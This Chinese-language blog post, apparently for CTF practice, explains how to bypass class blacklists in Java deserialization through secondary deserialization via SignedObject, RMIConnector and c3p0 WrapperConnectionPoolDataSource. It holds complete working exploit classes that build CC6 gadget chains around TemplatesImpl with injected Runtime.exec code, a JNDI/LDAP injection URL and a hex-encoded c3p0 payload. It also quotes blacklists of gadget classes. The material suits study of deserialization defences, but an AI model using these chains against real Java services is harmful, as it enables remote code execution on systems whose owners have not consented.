# 二次反序列化

最近遇到了很多java题目，大都弄了个类继承`ObjectInputStream`，重写其`resolveClass`方法，在里面添加对反序列化类黑名单的校验。比如下面这个

```java
public class MyObjectInputStream extends ObjectInputStream {

   private static final String[] blacklist = new String[]{
           "java\\.security.*", "java\\.rmi.*",  "com\\.fasterxml.*", "com\\.ctf\\.*",
           "org\\.springframework.*", "org\\.yaml.*", "javax\\.management\\.remote.*"
   };

   public MyObjectInputStream(InputStream inputStream) throws IOException {
      super(inputStream);
   }

   protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
      if(!contains(cls.getName())) {
         return super.resolveClass(cls);
      } else {
         throw new InvalidClassException("Unexpected serialized class", cls.getName());
      }
   }

   public static boolean contains(String targetValue) {
      for (String forbiddenPackage : blacklist) {
         if (targetValue.matches(forbiddenPackage))
            return true;
      }
      return false;
   }
}
```

或是这样子

```java
public class MyownObjectInputStream extends ObjectInputStream {
    private ArrayList Blacklist = new ArrayList();

    public MyownObjectInputStream(InputStream in) throws IOException {
        super(in);
        this.Blacklist.add(Hashtable.class.getName());
        this.Blacklist.add(HashSet.class.getName());
        this.Blacklist.add(JdbcRowSetImpl.class.getName());
        this.Blacklist.add(TreeMap.class.getName());
        this.Blacklist.add(HotSwappableTargetSource.class.getName());
        this.Blacklist.add(XString.class.getName());
        this.Blacklist.add(BadAttributeValueExpException.class.getName());
        this.Blacklist.add(TemplatesImpl.class.getName());
        this.Blacklist.add(ToStringBean.class.getName());
        this.Blacklist.add("com.sun.jndi.ldap.LdapAttribute");
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (this.Blacklist.contains(desc.getName())) {
            throw new InvalidClassException("dont do this");
        } else {
            return super.resolveClass(desc);
        }
    }
}
```

当然平时没事的时候可以研究一下这些黑名单中的类在反序列化中的关键用途

但是在比赛做题的时候就很恼火了，若没有积累充足的Java反序列化利用链经验，很难绕过；比赛时临时去找触发类也挺难的。

Java题就变成一道类的排列组合题了🤯，拼出一条可以打通的在黑名单之外的利用链。

这时候就可以考虑一下二次反序列化了，不用你定义的检测黑名单的`ObjectInputStream`去加载序列化对象，而是找到一条可以触发`readObject`的链子，用原生的`ObjectInputStream`去`resolveClass`

# SignedObject

`java.security.SignedObject#getObject`

这个类在`Hessian`反序列化中用过，由于`Hessian`反序列化的特殊性，不会执行类的`readObject`来反序列化，而是通过反射获取field再填充进一个空的实例化对象，导致`TemplatesImpl`不能利用。

```java
public final class SignedObject implements Serializable {
        public SignedObject(Serializable object, PrivateKey signingKey,
                        Signature signingEngine)
        throws IOException, InvalidKeyException, SignatureException {
            // creating a stream pipe-line, from a to b
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            ObjectOutput a = new ObjectOutputStream(b);

            // write and flush the object content to byte array
            a.writeObject(object);
            a.flush();
            a.close();
            this.content = b.toByteArray();
            b.close();

            // now sign the encapsulated object
            this.sign(signingKey, signingEngine);
    }
        public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
}
```

🚩触发方式：能够执行类的`getter`方法，比如配合`ROME`或`FastJson`打

```java
KeyPairGenerator keyPairGenerator;
keyPairGenerator = KeyPairGenerator.getInstance("DSA");
keyPairGenerator.initialize(1024);
KeyPair keyPair = keyPairGenerator.genKeyPair();
PrivateKey privateKey = keyPair.getPrivate();
Signature signingEngine = Signature.getInstance("DSA");

SignedObject signedObject = new SignedObject(object_with_evil_readObject, privateKey, signingEngine);
```

# SerializationUtils

`org.springframework.util.SerializationUtils.deserialize`





# RMIConnector

`javax.management.remote.rmi.RMIConnector#findRMIServerJRMP`

```java
private RMIServer findRMIServerJRMP(String base64, Map<String, ?> env, boolean isIiop)
    throws IOException {

    final byte[] serialized;
    try {
        serialized = base64ToByteArray(base64);
    } //....
    final ByteArrayInputStream bin = new ByteArrayInputStream(serialized);

    final ClassLoader loader = EnvHelp.resolveClientClassLoader(env);
    final ObjectInputStream oin =
        (loader == null) ?
        new ObjectInputStream(bin) :
    new ObjectInputStreamWithLoader(bin, loader);
    final Object stub;
    try {
        stub = oin.readObject();
    } // ....
}
```

若能控制base64参数的内容就可以使用`ObjectInputStream`的`resolveClass`来加载对应的类

往上回溯

```java
private RMIServer findRMIServer(JMXServiceURL directoryURL,
                                Map<String, Object> environment) {
    final boolean isIiop = RMIConnectorServer.isIiopURL(directoryURL,true);
    if (isIiop) {
        // Make sure java.naming.corba.orb is in the Map.
        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));
    }

    String path = directoryURL.getURLPath();
    int end = path.indexOf(';');
    if (end < 0) end = path.length();
    if (path.startsWith("/jndi/"))
        return findRMIServerJNDI(path.substring(6,end), environment, isIiop);
    else if (path.startsWith("/stub/"))
        return findRMIServerJRMP(path.substring(6,end), environment, isIiop);
    else if (path.startsWith("/ior/")) {
        if (!IIOPHelper.isAvailable())
            throw new IOException("iiop protocol not available");
        return findRMIServerIIOP(path.substring(5,end), environment, isIiop);
    } else {
        final String msg = "URL path must begin with /jndi/ or /stub/ " +
            "or /ior/: " + path;
        throw new MalformedURLException(msg);
    }
}
```

`path`以`/stub/`开头就能进到`findRMIServerJRMP`

在往上发现`connect`和`doStart`调用了`findRMIServer`

```java
public void connect() throws IOException {
        connect(null);
}
public synchronized void connect(Map<String,?> environment) {
    final boolean tracing = logger.traceOn();
    String        idstr   = (tracing?"["+this.toString()+"]":null);

    if (terminated) {
        logger.trace("connect",idstr + " already closed.");
        throw new IOException("Connector closed");
    }
    if (connected) {
        logger.trace("connect",idstr + " already connected.");
        return;
    }

    try {
        if (tracing) logger.trace("connect",idstr + " connecting...");

        final Map<String, Object> usemap =
            new HashMap<String, Object>((this.env==null) ?
                                        Collections.<String, Object>emptyMap() : this.env);


        if (environment != null) {
            EnvHelp.checkAttributes(environment);
            usemap.putAll(environment);
        }

        // Get RMIServer stub from directory or URL encoding if needed.
        if (tracing) logger.trace("connect",idstr + " finding stub...");
        RMIServer stub = (rmiServer!=null)?rmiServer:
        findRMIServer(jmxServiceURL, usemap);
    }
}

protected void doStart() throws IOException {
    // Get RMIServer stub from directory or URL encoding if needed.
    RMIServer stub;
    try {
        stub = (rmiServer!=null)?rmiServer:
        findRMIServer(jmxServiceURL, env);
    }
}
```

利用CC链的`InvokerTransformer`来触发`connect`（`doStart`被`protected`修饰，不能用`InvokerTransformer`触发）

下面以CC6为例

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;

public class RMIConnectorTest {
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String getCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "p4d0rn");
        setValue(templates, "_tfactory", null);

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "xxx");

        outerMap.clear();

        setValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.close();

        return new String(Base64.getEncoder().encode(baos.toByteArray()));
    }

    public static void main(String args[]) throws Exception {
        RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL("service:jmx:rmi://127.0.0.1:8888/stub/" + getCode()), new HashMap<>());
        Transformer invokeTransformer = InvokerTransformer.getInstance("connect");
        Transformer constantTransformer = new ConstantTransformer(1);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, constantTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "test");

        Map expMap = new HashMap();
        // put的时候也会执行hashCode，为了防止本地调试触发payload，这里放入假的payload
        expMap.put(entry, "xxx");
        lazyMap.remove("test");

        // 将真正的transformers数组设置进来
        setValue(lazyMap,"factory", invokeTransformer);
        setValue(entry,"key", rmiConnector);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

可以看到`findRMIServerJRMP`支持`jndi`、`stub`、`iiop`

跟进`path`以`/jndi/`开头的分支：`findRMIServerJNDI`

```java
private RMIServer findRMIServerJNDI(String jndiURL, Map<String, ?> env,
                                    boolean isIiop)
    throws NamingException {

    InitialContext ctx = new InitialContext(EnvHelp.mapToHashtable(env));

    Object objref = ctx.lookup(jndiURL);
    ctx.close();

    // ....
}
```

熟悉的`InitialContext#lookup`，改一下`path`就可以`jndi`注入了

```java
new JMXServiceURL("service:jmx:rmi://127.0.0.1:8888/jndi/ldap://127.0.0.1:8099/aaa" )
```

# WrapperConnectionPoolDataSource

`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setuserOverridesAsString`可以跟进到

`C3P0ImplUtils#parseUserOverridesAsString`

```java
private final static String HASM_HEADER = "HexAsciiSerializedMap";
public static Map parseUserOverridesAsString( String userOverridesAsString ){ 
    if (userOverridesAsString != null)
    {
        String hexAscii = userOverridesAsString.substring(HASM_HEADER.length() + 1, userOverridesAsString.length() - 1);
        byte[] serBytes = ByteUtils.fromHexAscii( hexAscii );
        return Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );
    }
    else
        return Collections.EMPTY_MAP;
}
```

注意这里字符截取是从`HASM_HEADER.length() + 1`到`userOverridesAsString.length() - 1`，最后一位会吃掉

`SerializableUtils#fromByteArray`

```java
public static Object fromByteArray(byte[] bytes) { 
    Object out = deserializeFromByteArray( bytes ); 
    if (out instanceof IndirectlySerialized)
        return ((IndirectlySerialized) out).getObject();
    else
        return out;
}

public static Object deserializeFromByteArray(byte[] bytes){
    ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
    return in.readObject();
}
```

配合`fastjson`或`ROME`

```java
import java.io.ByteArrayOutputStream;

import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import com.mchange.lang.ByteUtils;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


public class Exp {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getCC6Bytes() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "p4d0rn");
        setValue(templates, "_tfactory", null);

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "xxx");

        outerMap.clear();

        setValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.close();

        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception{
        String hex = ByteUtils.toHexAscii(getCC6Bytes());
        String payload = "HexAsciiSerializedMap:" + hex + '!';
        WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource();
        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);
    }
}
```

# Reference

* https://www.anquanke.com/post/id/256986#h3-9

* [c3p0的三个gadget的学习 | Y4tacker's Blog](https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0的三个gadget的学习/#hex序列化字节加载器)

  

